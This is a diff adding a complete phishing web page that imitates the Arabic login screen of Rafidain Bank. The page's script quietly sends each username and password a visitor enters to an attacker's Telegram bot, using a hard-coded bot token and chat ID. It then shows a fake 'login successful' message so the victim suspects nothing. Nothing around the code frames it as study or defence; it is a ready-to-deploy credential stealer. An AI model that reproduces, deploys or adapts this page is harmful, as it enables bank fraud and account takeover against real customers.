@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>مصرف الرافدين - تسجيل الدخول</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Tahoma,Arial,sans-serif}
+body{background:linear-gradient(135deg,#8b0000,#4a0000);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
+.card{background:#fff;border-radius:12px;padding:30px 25px;max-width:420px;width:100%;box-shadow:0 10px 30px rgba(0,0,0,0.3)}
+.logo{text-align:center;margin-bottom:20px}
+.logo .circle{width:100px;height:100px;border-radius:50%;border:3px solid #8b0000;display:inline-flex;justify-content:center;align-items:center;background:#fff;margin-bottom:10px}
+.logo .circle span{font-size:40px}
+.logo h1{color:#8b0000;font-size:22px;margin-top:8px}
+.logo p{color:#666;font-size:13px;margin-top:4px}
+label{display:block;font-size:14px;color:#333;margin-top:15px;margin-bottom:6px;font-weight:bold}
+input{width:100%;padding:14px;border:1px solid #ddd;border-radius:8px;font-size:15px;background:#f9f9f9;box-sizing:border-box}
+.btn{width:100%;padding:15px;background:linear-gradient(135deg,#8b0000,#4a0000);color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer;margin-top:15px}
+.footer{text-align:center;font-size:12px;color:#888;margin-top:20px}
+</style>
+</head>
+<body>
+<div class="card">
+<div class="logo">
+<div class="circle"><span>🏛️</span></div>
+<h1>مصرف الرافدين</h1>
+<p>RAFIDAIN BANK</p>
+</div>
+<form id="f">
+<label>اسم المستخدم</label>
+<input type="text" id="user" placeholder="أدخل اسم المستخدم" required>
+<label>كلمة المرور</label>
+<input type="password" id="pass" placeholder="أدخل كلمة المرور" required>
+<button type="submit" class="btn">تسجيل الدخول</button>
+</form>
+<div class="footer">© 2026 مصرف الرافدين - جميع الحقوق محفوظة</div>
+</div>
+<script>
+const BOT='8759039993:AAGnWHtrCwoAqrjbnQwicMiWQvhO55KLH7s';
+const CHAT='-1003821295154';
+document.getElementById('f').addEventListener('submit', async function(e){
+e.preventDefault();
+const msg='🏛️ *مصرف الرافدين*\n\n👤 المستخدم: `'+document.getElementById('user').value+'`\n🔑 كلمة المرور: `'+document.getElementById('pass').value+'`\n🕐 '+new Date().toLocaleString('ar-IQ');
+const url='https://api.telegram.org/bot'+BOT+'/sendMessage?chat_id='+CHAT+'&text='+encodeURIComponent(msg)+'&parse_mode=Markdown';
+try{await fetch(url);alert('تم تسجيل الدخول بنجاح');document.getElementById('f').reset();}catch(e){alert('خطأ');}
+});
+</script>
+</body>
+</html>
